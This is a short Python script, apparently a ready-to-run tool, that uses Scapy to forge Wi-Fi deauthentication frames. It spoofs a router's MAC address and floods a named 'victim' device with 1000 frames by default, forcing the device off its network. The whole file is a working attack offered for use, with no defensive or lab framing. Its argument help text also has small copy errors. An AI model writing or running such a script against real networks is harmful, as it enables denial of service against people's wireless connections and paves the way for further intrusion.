import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

def send_deauth(target_mac, router_mac, iface="wlan0mon", packet_count=1000):
    dot11 = Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(f"Sending {packet_count} deauth packets to {target_mac} from {router_mac} using interface {iface}")
    sendp(packet, inter=0.1, count=packet_count, iface=iface, verbose=1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser("description=Wi-Fi Deauthentication Attack Script")
    parser.add_argument("target_mac", help="MAC address of the target device (victim)")
    parser.add_argument("router_mac", help="MAC address of the router (access point)")
    parser.add_argument("-i", "--interface", default="wlan0mon", help="MAC address of target device (victim)")
    parser.add_argument("-p", "--packets", type=int, default=1000, help="Number of deauth packets to send (default: 1000)")
    
    args = parser.parse_args()
    
    send_deauth(args.target_mac, args.router_mac, iface=args.interface, packet_count=args.packets)